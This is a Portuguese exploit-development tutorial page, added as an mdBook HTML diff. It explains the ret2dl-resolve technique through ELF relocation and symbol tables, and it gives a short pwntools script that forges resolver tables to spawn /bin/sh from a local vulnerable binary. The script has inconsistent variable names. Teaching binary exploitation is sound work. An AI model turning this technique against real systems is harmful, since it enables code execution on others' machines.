@@ -1,0 +1,387 @@
+<!DOCTYPE HTML>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <title>ret2dl-resolve - Um Livrinho Sobre Exploit Dev</title>
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <base href="../../">
+
+        <link rel="stylesheet" href="book.css">
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css">
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:500" rel="stylesheet" type="text/css">
+
+        <link rel="shortcut icon" href="favicon.png">
+
+        <!-- Font Awesome -->
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme -->
+        
+
+        
+
+        <!-- Fetch Clipboard.js from CDN but have a local fallback -->
+        <script src="https://cdn.jsdelivr.net/clipboard.js/1.6.1/clipboard.min.js"></script>
+        <script>
+            if (typeof Clipboard == 'undefined') {
+                document.write(unescape("%3Cscript src='clipboard.min.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch JQuery from CDN but have a local fallback -->
+        <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+        <script>
+            if (typeof jQuery == 'undefined') {
+                document.write(unescape("%3Cscript src='jquery.js'%3E%3C/script%3E"));
+            }
+        </script>
+
+        <!-- Fetch store.js from local - TODO add CDN when 2.x.x is available on cdnjs -->
+        <script src="store.js"></script>
+
+    </head>
+    <body class="light">
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme = store.get('mdbook-theme');
+            if (theme === null || theme === undefined) { theme = 'light'; }
+            $('body').removeClass().addClass(theme);
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var sidebar = store.get('mdbook-sidebar');
+            if (sidebar === "hidden") { $("html").addClass("sidebar-hidden") }
+            else if (sidebar === "visible") { $("html").addClass("sidebar-visible") }
+        </script>
+
+        <div id="sidebar" class="sidebar">
+            <ul class="chapter"><li><a href="./mapa.html"><strong>1.</strong> Mapa</a></li><li class="spacer"></li><li><a href="./stack/stack.html"><strong>2.</strong> Stack</a></li><li><a href="./stack/phoenix/setup.html"><strong>3.</strong> Phoenix Stack</a></li><li><ul class="section"><li><a href="./stack/phoenix/StackZero.html"><strong>3.1.</strong> Stack Zero</a></li><li><a href="./stack/phoenix/StackOne.html"><strong>3.2.</strong> Stack One</a></li><li><a href="./stack/phoenix/StackTwo.html"><strong>3.3.</strong> Stack Two</a></li><li><a href="./stack/phoenix/StackThree.html"><strong>3.4.</strong> Stack Three</a></li><li><a href="./stack/phoenix/StackFour.html"><strong>3.5.</strong> Stack Four</a></li><li><a href="./stack/phoenix/StackFive.html"><strong>3.6.</strong> Stack Five</a></li><li><a href="./stack/phoenix/StackSix.html"><strong>3.7.</strong> Stack Six</a></li></ul></li><li><a href="./stack/mitigacoes.html"><strong>4.</strong> Mitigações</a></li><li><a href="./stack/ret2libc.html"><strong>5.</strong> Ret2LibC</a></li><li><ul class="section"><li><strong>5.1.</strong> Protostar Stack Six</li><li><strong>5.2.</strong> Avançado: Múltiplos ret2libc</li></ul></li><li><a href="./stack/gotplt.html"><strong>6.</strong> GOT e PLT</a></li><li><a href="./stack/rop/intro.html"><strong>7.</strong> ROP</a></li><li><ul class="section"><li><a href="./stack/rop/primitivos.html"><strong>7.1.</strong> Primitivos</a></li><li><ul class="section"><li><a href="./stack/rop/ROPE/dump.html"><strong>7.1.1.</strong> ROPE</a></li></ul></li><li><strong>7.2.</strong> Pivot</li><li><ul class="section"><li><a href="./stack/rop/ROPE/pivot.html"><strong>7.2.1.</strong> ROPE: pivot</a></li></ul></li><li><a href="./stack/rop/SROP/SROP.html"><strong>7.3.</strong> SROP</a></li><li><a href="./stack/rop/ret2dlresolve.html" class="active"><strong>7.4.</strong> ret2dl-resolve</a></li></ul></li><li><a href="./stack/ASLR/aslr.html"><strong>8.</strong> ASLR</a></li><li><ul class="section"><li><a href="./stack/ASLR/corromperGOT.html"><strong>8.1.</strong> Corromper GOT</a></li><li><a href="./stack/ASLR/ret2plt.html"><strong>8.2.</strong> ret2plt</a></li></ul></li><li><strong>9.</strong> Canary</li><li><strong>10.</strong> PIE</li><li><a href="./stack/leakAll.html"><strong>11.</strong> Extra: Leakando tudo</a></li><li class="spacer"></li><li><a href="./heap/heap.html"><strong>12.</strong> Heap</a></li><li><a href="./heap/intro.html"><strong>13.</strong> Intro</a></li><li><strong>14.</strong> Bugs Gerais</li><li><ul class="section"><li><strong>14.1.</strong> UAF</li><li><ul class="section"><li><a href="./heap/geral/uaf/heap-two.html"><strong>14.1.1.</strong> Exploit Education: Heap Two</a></li></ul></li></ul></li><li><a href="./heap/relacionados/relacionados.html"><strong>15.</strong> Conceitos Relacionados</a></li><li><ul class="section"><li><a href="./heap/relacionados/io_list_all.html"><strong>15.1.</strong> _IO_list_all</a></li></ul></li><li><a href="./heap/malloc/intro.html"><strong>16.</strong> Atacando Malloc</a></li><li><ul class="section"><li><a href="./heap/malloc/teoria.html"><strong>16.1.</strong> Teoria</a></li><li><a href="./heap/malloc/fastbinsDup.html"><strong>16.2.</strong> Fastbins Dup</a></li><li><a href="./heap/malloc/HouseOfForce.html"><strong>16.3.</strong> House of Force</a></li><li><a href="./heap/malloc/HouseOfSpirit.html"><strong>16.4.</strong> House of Spirit</a></li><li><a href="./heap/malloc/unsafeUnlink.html"><strong>16.5.</strong> Unsafe Unlink</a></li><li><a href="./heap/malloc/safeUnlink.html"><strong>16.6.</strong> Safe Unlink</a></li><li><a href="./heap/malloc/PartialUnlink.html"><strong>16.7.</strong> Unsorted bins: Partial Unlink</a></li><li><a href="./heap/malloc/HouseOfOrange.html"><strong>16.8.</strong> House of Orange</a></li><li><a href="./heap/malloc/HouseOfLore.html"><strong>16.9.</strong> House of Lore</a></li><li><strong>16.10.</strong> House of Rust</li><li><strong>16.11.</strong> House of Corrosion</li><li><strong>16.12.</strong> House of Einherjar</li></ul></li><li><strong>17.</strong> Extra</li><li class="spacer"></li><li><a href="./linux_internals/linux.html"><strong>18.</strong> Linux Internals</a></li><li><a href="./linux_internals/prerequisitos.html"><strong>19.</strong> Prerequisitos</a></li></ul>
+        </div>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page" tabindex="-1">
+                
+                <div id="menu-bar" class="menu-bar">
+                    <div class="left-buttons">
+                        <i id="sidebar-toggle" class="fa fa-bars" title="Toggle sidebar"></i>
+                        <i id="theme-toggle" class="fa fa-paint-brush" title="Change theme"></i>
+                    </div>
+
+                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>
+
+                    <div class="right-buttons">
+                        <a href="print.html">
+                            <i id="print-button" class="fa fa-print" title="Print this book"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="content" class="content">
+                    <a class="header" href="./stack/rop/ret2dlresolve.html#ret2dl-resolve" id="ret2dl-resolve"><h1>Ret2dl-resolve</h1></a>
+<ul>
+<li><a href="./stack/rop/ret2dlresolve.html#ret2dl-resolve">Ret2dl-resolve</a></li>
+<li><a href="./stack/rop/ret2dlresolve.html#teoria">Teoria</a>
+<ul>
+<li><a href="./stack/rop/ret2dlresolve.html#jmprel">JMPREL</a></li>
+<li><a href="./stack/rop/ret2dlresolve.html#strtab">STRTAB</a></li>
+<li><a href="./stack/rop/ret2dlresolve.html#symtab">SYMTAB</a></li>
+<li><a href="./stack/rop/ret2dlresolve.html#exemplo">Exemplo</a></li>
+<li><a href="./stack/rop/ret2dlresolve.html#_dl_runtime_resolve">_dl_runtime_resolve</a></li>
+</ul>
+</li>
+<li><a href="./stack/rop/ret2dlresolve.html#exploit">Exploit</a></li>
+<li><a href="./stack/rop/ret2dlresolve.html#manual">Manual</a></li>
+<li><a href="./stack/rop/ret2dlresolve.html#ctfs">CTFs</a></li>
+<li><a href="./stack/rop/ret2dlresolve.html#fontes-e-cr%C3%A9ditos">Fontes e créditos</a></li>
+</ul>
+<p>Nos ja sabemos que, quando o programa usa uma função do libc,
+ela terá uma entrada na plt, que somente quando usada sera
+preenchida na got...</p>
+<p>Mas e se o programa nao usar uma função, existe algum jeito de
+resolve-la?</p>
+<a class="header" href="./stack/rop/ret2dlresolve.html#teoria" id="teoria"><h1>Teoria</h1></a>
+<p>A section <code>.dynamic</code> contem os dados usados para que <code>ld.so</code>
+resolva os símbolos... Voce pode ve-la usando <code>readelf -d</code></p>
+<pre><code class="language-py">$ readelf -d /bin/ls
+
+Dynamic section at offset 0x21a58 contains 28 entries:
+  Tag        Type                         Name/Value
+ 0x0000000000000001 (NEEDED)             Shared library: [libselinux.so.1]
+ 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
+ 0x000000000000000c (INIT)               0x4000
+ 0x000000000000000d (FINI)               0x17574
+ 0x0000000000000019 (INIT_ARRAY)         0x22010
+ 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
+ 0x000000000000001a (FINI_ARRAY)         0x22018
+ 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
+ 0x000000006ffffef5 (GNU_HASH)           0x3a0
+ 0x0000000000000005 (STRTAB)             0x1190
+ 0x0000000000000006 (SYMTAB)             0x488
+ 0x000000000000000a (STRSZ)              1612 (bytes)
+ 0x000000000000000b (SYMENT)             24 (bytes)
+ 0x0000000000000015 (DEBUG)              0x0
+ 0x0000000000000003 (PLTGOT)             0x22c58
+ 0x0000000000000002 (PLTRELSZ)           2544 (bytes)
+ 0x0000000000000014 (PLTREL)             RELA
+ 0x0000000000000017 (JMPREL)             0x2cb8
+ 0x0000000000000007 (RELA)               0x1968
+ 0x0000000000000008 (RELASZ)             4944 (bytes)
+ 0x0000000000000009 (RELAENT)            24 (bytes)
+ 0x000000000000001e (FLAGS)              BIND_NOW
+ 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
+ 0x000000006ffffffe (VERNEED)            0x18f8
+ 0x000000006fffffff (VERNEEDNUM)         1
+ 0x000000006ffffff0 (VERSYM)             0x17dc
+ 0x000000006ffffff9 (RELACOUNT)          193
+ 0x0000000000000000 (NULL)               0x0
+</code></pre>
+<p>Porem para essa tecnica so precisamos de 3: STRTAB, SYMTAB, JMPREL</p>
+<a class="header" href="./stack/rop/ret2dlresolve.html#jmprel" id="jmprel"><h2>JMPREL</h2></a>
+<p>JMPREL (<code>.rel.plt</code>) contem a <code>Relocation Table</code>. A qual contem o
+endereco dos simbolos realocados. Ela pode ser lida com
+<code>readelf -r</code></p>
+<p>Com <code>Sym.Name</code> sendo o nome, <code>Offset</code> o endereco na GOT, e
+<code>Info e Type</code> sendo mais alguns metadados</p>
+<pre><code class="language-C"># readelf -r ./babystack
+
+Relocation section '.rel.dyn' at offset 0x2a8 contains 1 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
+
+Relocation section '.rel.plt' at offset 0x2b0 contains 3 entries:
+ Offset     Info    Type            Sym.Value  Sym. Name
+0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
+0804a010  00000207 R_386_JUMP_SLOT   00000000   alarm@GLIBC_2.0
+0804a014  00000407 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
+</code></pre>
+<p>O tipo das entradas é <code>ELF32_Re1</code></p>
+<pre><code class="language-C">typedef uint32_t Elf32_Addr ; 
+typedef uint32_t Elf32_Word ; 
+typedef struct 
+{
+   Elf32_Addr r_offset ; /* Address */ 
+   Elf32_Word r_info ; /* Relocation type and symbol index */ 
+} Elf32_Rel ; 
+#define ELF32_R_SYM(val) ((val) &gt;&gt; 8) 
+#define ELF32_R_TYPE(val) ((val) &amp; 0xff)
+</code></pre>
+<p>Por exemplo para:</p>
+<pre><code> Offset     Info    Type            Sym.Value  Sym. Name
+0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
+</code></pre>
+<ul>
+<li>ELF32_R_SYM(r_info) == 1
+<ul>
+<li>0x0107 &gt;&gt; 8 == 1</li>
+</ul>
+</li>
+<li>ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)
+<ul>
+<li>0x0107 &amp;&amp; 0xff = 0x0007</li>
+</ul>
+</li>
+</ul>
+<a class="header" href="./stack/rop/ret2dlresolve.html#strtab" id="strtab"><h2>STRTAB</h2></a>
+<p>STRTAB é uma table que armazena as strings para os nomes dos
+símbolos</p>
+<pre><code class="language-C">gdb&gt; x/10s 0x804822c # Endereço STRTAB
+0x804822c:	&quot;&quot;
+0x804822d:	&quot;libc.so.6&quot;
+0x8048237:	&quot;_IO_stdin_used&quot;
+0x8048246:	&quot;read&quot;
+0x804824b:	&quot;alarm&quot;
+0x8048251:	&quot;__libc_start_main&quot;
+0x8048263:	&quot;__gmon_start__&quot;
+0x8048272:	&quot;GLIBC_2.0&quot;
+</code></pre>
+<a class="header" href="./stack/rop/ret2dlresolve.html#symtab" id="symtab"><h2>SYMTAB</h2></a>
+<p>SYMTAB é uma table que armazena <code>ELF32_Sym</code>...</p>
+<p>O qual contem <code>st_name</code>: o offset do nome do simbolo dentro da
+STRTAB</p>
+<pre><code class="language-C">typedef struct 
+{ 
+   Elf32_Word st_name ; /* Symbol name (string tbl index) */
+   Elf32_Addr st_value ; /* Symbol value */ 
+   Elf32_Word st_size ; /* Symbol size */ 
+   unsigned char st_info ; /* Symbol type and binding */ 
+   unsigned char st_other ; /* Symbol visibility under glibc&gt;=2.2 */ 
+   Elf32_Section st_shndx ; /* Section index */ 
+} Elf32_Sym ;
+</code></pre>
+<p><code>st_name</code> é o primeiro membro do struct</p>
+<p>Nos podemos saber qual o index do nosso simbolo na SYMTAB,
+usando a macro <code>ELF32_R_SYM</code></p>
+<a class="header" href="./stack/rop/ret2dlresolve.html#exemplo" id="exemplo"><h2>Exemplo</h2></a>
+<p>Portanto:</p>
+<ul>
+<li>JMPREL - r_value (que vira o index na SYMTAB), endereço na GOT</li>
+<li>STRTAB - Armazena os nomes</li>
+<li>SYMTAB - pointer para o nome na STRTAB</li>
+</ul>
+<p>Por exemplo para a seguinte entrada na JMPREL:</p>
+<pre><code> Offset     Info    Type            Sym.Value  Sym. Name
+0804a00c  00000107 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
+</code></pre>
+<ul>
+<li>ELF32_R_SYM(r_info) == 1
+<ul>
+<li>0x0107 &gt;&gt; 8 == 1</li>
+</ul>
+</li>
+<li>ELF32_R_TYPE(r_info) == 7 (R_386_JUMP_SLOT)
+<ul>
+<li>0x0107 &amp;&amp; 0xff = 0x0007</li>
+</ul>
+</li>
+</ul>
+<p>O R_SYM (1) é o offset da entrada no simbolo na
+table SYMTAB, que pode ser usado:</p>
+<pre><code>0x80481cc  +   1   * 16
+SYMTAB     + index * sizeof(entry)) 
+</code></pre>
+<p>Checando esse endereço, nos temos o struct referente a
+aquele simbolo, e portanto no mesmo endereço o <code>st_name</code></p>
+<p>Vamos supor que nesse caso, <code>st_name = 0x1a</code></p>
+<p>Agora podemos ver o nome do simbolo no STRTAB</p>
+<pre><code class="language-C">x/s 0x804822c   +   0x1a
+    STRTAB      +   st_name
+0x8048246:	&quot;read&quot;
+</code></pre>
+<a class="header" href="./stack/rop/ret2dlresolve.html#_dl_runtime_resolve" id="_dl_runtime_resolve"><h2>_dl_runtime_resolve</h2></a>
+<p>Agora, como funciona a resolução de símbolos?</p>
+<p>Ver qual a entrada da GOT referente ao simbolo e pular para PLT</p>
+<pre><code class="language-x86asm">read@plt:
+   jmp    DWORD PTR ds:0x804a00c
+   push   0x0
+   jmp    0x80482f0
+</code></pre>
+<p>Na PLT, push em <code>reloc_offset</code> e ir para o resolvedor</p>
+<p>Agora o resolvedor (<code>dl-resolve()</code>) ira usar o <code>reloc_offset</code>
+para preencher as os campos de relocação e na SYMTAB</p>
+<pre><code class="language-C++">_dl_runtime_resolve ( link_map , rel_offset );
+Com:
+    link_map   =  lista com todas as libs carregadas
+                  _dl_runtime_resolve vai usada-las 
+                  para resolver os símbolos
+
+    rel_offset =  Offset de Elf32_Rel na JMPREL
+
+o simbolo sera relocados a função original sera chamada :D
+
+// call nao resolvida de read(0, buf, 0x100)
+_dl_runtime_resolve(link_map, rel_offset) {
+
+    // Encontrar na JMPREL usando o offset (type = Elf32_Rel) 
+    rel_entry = JMPREL + rel_offset ;
+
+    // Encontrar na SYMTAB usando r_info (type = Elf32_Sym)
+    sym_entry = &amp;SYMTAB [ ELF32_R_SYM ( rel_entry -&gt; r_info )];
+
+    // Encontrar nome na STRTAB usando st_name (type = char* / string)
+    sym_name = STRTAB + sym_entry -&gt; st_name ;
+
+    // Usar o nome para encontrar o simbolo na lista de libs
+    _search_for_symbol_(link_map, sym_name);
+
+    // call read, ja que o simbolo foi resolvido
+    read(0, buf, 0x100);
+}
+</code></pre>
+<a class="header" href="./stack/rop/ret2dlresolve.html#exploit" id="exploit"><h1>Exploit</h1></a>
+<p>Nos podemos usar o helper do pwntools para facilmente gerar as
+tables com offsets corretos e tudo mais. Caso vc tenha
+curiosidade, pode ler a proxima seção ...</p>
+<p>Porem, no pwntools podemos automar isso usando:</p>
+<pre><code class="language-py">elf = ELF('./vuln')
+io = process(elf.path)
+rop = ROP(elf)
+
+payload = Ret2dlresolvePayload(
+  elf,
+  symbol='system',
+  args=['/bin/sh']
+)
+
+rop.raw('A' * pad)
+rop.read(0, dlresolve.data_addr) # criar tables falsas
+rop.ret2dlresolve(dlresolve) # chamar dl-resolve() com reloc_offset falso
+
+io.sendline(rop.chain()) # A chain vai chamar read de novo, para enviar as tables
+io.sendline(dlresolve.payload)
+
+io.interactive()
+</code></pre>
+<a class="header" href="./stack/rop/ret2dlresolve.html#manual" id="manual"><h1>Manual</h1></a>
+<a class="header" href="./stack/rop/ret2dlresolve.html#ctfs" id="ctfs"><h1>CTFs</h1></a>
+<a class="header" href="./stack/rop/ret2dlresolve.html#fontes-e-créditos" id="fontes-e-créditos"><h1>Fontes e créditos</h1></a>
+<ul>
+<li>https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62#5-_dl_runtime_resolve</li>
+<li>https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve</li>
+<li>https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation</li>
+</ul>
+
+                </div>
+
+                <!-- Mobile navigation buttons -->
+                
+                    <a rel="prev" href="./stack/rop/SROP/SROP.html" class="mobile-nav-chapters previous" title="Previous chapter">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                
+
+                
+                    <a rel="next" href="./stack/ASLR/aslr.html" class="mobile-nav-chapters next" title="Next chapter">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+                
+
+            </div>
+
+            
+                <a href="./stack/rop/SROP/SROP.html" class="nav-chapters previous" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+            
+
+            
+                <a href="./stack/ASLR/aslr.html" class="nav-chapters next" title="You can navigate through the chapters using the arrow keys">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+            
+
+        </div>
+
+
+        <!-- Local fallback for Font Awesome -->
+        <script>
+            if ($(".fa").css("font-family") !== "FontAwesome") {
+                $('<link rel="stylesheet" type="text/css" href="_FontAwesome/css/font-awesome.css">').prependTo('head');
+            }
+        </script>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        
+
+        
+
+        
+
+        
+
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS script -->
+        
+
+    </body>
+</html>
